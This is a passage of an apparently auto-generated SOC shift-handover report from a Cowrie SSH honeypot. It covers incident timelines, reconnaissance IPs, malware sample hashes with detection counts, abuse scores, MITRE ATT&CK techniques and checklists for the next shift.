| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:54:46` | `cowrie.session.connect` |
| `2026-03-30 14:54:46` | `cowrie.client.version` |
| `2026-03-30 14:54:46` | `cowrie.client.kex` |
| `2026-03-30 14:54:47` | `cowrie.login.success` |
| `2026-03-30 14:54:47` | `cowrie.session.params` |
| `2026-03-30 14:54:47` | `cowrie.command.input` |
| `2026-03-30 14:54:47` | `cowrie.command.failed` |
| `2026-03-30 14:54:47` | `cowrie.log.closed` |
| `2026-03-30 14:54:48` | `cowrie.session.params` |
| `2026-03-30 14:54:48` | `cowrie.command.input` |
| `2026-03-30 14:54:48` | `cowrie.session.file_download` |
| `2026-03-30 14:54:48` | `cowrie.log.closed` |
| `2026-03-30 14:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.138.194[.]82` to AbuseIPDB if not already reported
- [ ] Block `180.138.194[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b8eeaf99298

| Field | Detail |
|---|---|
| **Source IP** | `180.138.194[.]82` |
| **First Seen** | 2026-03-30 14:54 |
| **Last Seen** | 2026-03-30 14:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:54:50` | `cowrie.session.connect` |
| `2026-03-30 14:54:50` | `cowrie.client.version` |
| `2026-03-30 14:54:50` | `cowrie.client.kex` |
| `2026-03-30 14:54:51` | `cowrie.login.success` |
| `2026-03-30 14:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.138.194[.]82` to AbuseIPDB if not already reported
- [ ] Block `180.138.194[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `49.64.86[.]110` | **6** | 2026-03-30 13:22 | 2026-03-30 13:33 | 8m | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | **5** | 2026-03-30 13:29 | 2026-03-30 13:37 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `14.103.127[.]199` | **3** | 2026-03-30 14:35 | 2026-03-30 14:41 | 6m | 0 | `T1592` | 🟢 LOW |
| `27.150.188[.]148` | **2** | 2026-03-30 13:22 | 2026-03-30 14:25 | 4m | 0 | `T1592` | 🟢 LOW |
| `34.102.80[.]93` | **2** | 2026-03-30 14:03 | 2026-03-30 14:07 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.47.142[.]192` | 1 | 2026-03-30 14:23 | 2026-03-30 14:23 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.171.31[.]37` | 1 | 2026-03-30 13:42 | 2026-03-30 13:43 | 100s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.112.194[.]160` | 1 | 2026-03-30 14:28 | 2026-03-30 14:28 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.23[.]251` | 1 | 2026-03-30 13:42 | 2026-03-30 13:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.19.44[.]93` | 1 | 2026-03-30 13:45 | 2026-03-30 13:45 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.217.188[.]122` | 1 | 2026-03-30 14:26 | 2026-03-30 14:26 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.221.175[.]214` | 1 | 2026-03-30 14:27 | 2026-03-30 14:27 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.173.77[.]121` | 1 | 2026-03-30 14:15 | 2026-03-30 14:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.187.237[.]122` | 1 | 2026-03-30 14:08 | 2026-03-30 14:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `136.248.73[.]230` | 1 | 2026-03-30 14:42 | 2026-03-30 14:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `144.62.246[.]70` | 1 | 2026-03-30 15:00 | 2026-03-30 15:00 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `149.54.15[.]162` | 1 | 2026-03-30 13:22 | 2026-03-30 13:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.138.194[.]82` | 1 | 2026-03-30 14:54 | 2026-03-30 14:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.209.117[.]124` | 1 | 2026-03-30 14:48 | 2026-03-30 14:48 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.245.95[.]11` | 1 | 2026-03-30 14:04 | 2026-03-30 14:04 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.180.2[.]62` | 1 | 2026-03-30 13:22 | 2026-03-30 13:22 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.134.187[.]231` | 1 | 2026-03-30 14:21 | 2026-03-30 14:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `37.238.45[.]202` | 1 | 2026-03-30 13:48 | 2026-03-30 13:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.178.70[.]3` | 1 | 2026-03-30 14:22 | 2026-03-30 14:22 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.75.185[.]71` | 1 | 2026-03-30 14:16 | 2026-03-30 14:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `65.20.251[.]41` | 1 | 2026-03-30 14:02 | 2026-03-30 14:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.240.223[.]240` | 1 | 2026-03-30 14:06 | 2026-03-30 14:06 | 10s | 0 | `T1592` | 🟢 LOW |
| `69.12.83[.]203` | 1 | 2026-03-30 14:32 | 2026-03-30 14:32 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.84.21[.]186` | 1 | 2026-03-30 13:28 | 2026-03-30 13:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.102.80[.]93` | US | Google LLC | **100** ⚠️ | 0 |
| `222.180.2[.]62` | CN | FengDu QiFei WangBa | **100** ⚠️ | 50 |
| `210.245.95[.]11` | VN | FPT Telecom Company | **100** ⚠️ | 50 |
| `66.240.223[.]240` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `69.12.83[.]203` | EE | HostPapa | **100** ⚠️ | 2 |
| `34.134.187[.]231` | US | Google LLC | **100** ⚠️ | 2 |
| `101.47.142[.]192` | SG | BYTEPLUS | **100** ⚠️ | 42 |
| `117.173.77[.]121` | CN | China Mobile Communications Corporation | **100** ⚠️ | 1 |
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |
| `149.54.15[.]162` | AF | Government Communications Network | **100** ⚠️ | 19 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 58 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 31 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 65 cases |
| Tool 34  | Credential Extractor        | ✅ 51 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (10.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 1 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 16 priority case(s) shown individually · 29 recon entry/entries in table (5 group(s) consolidating 18 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-30T15:02:13Z_
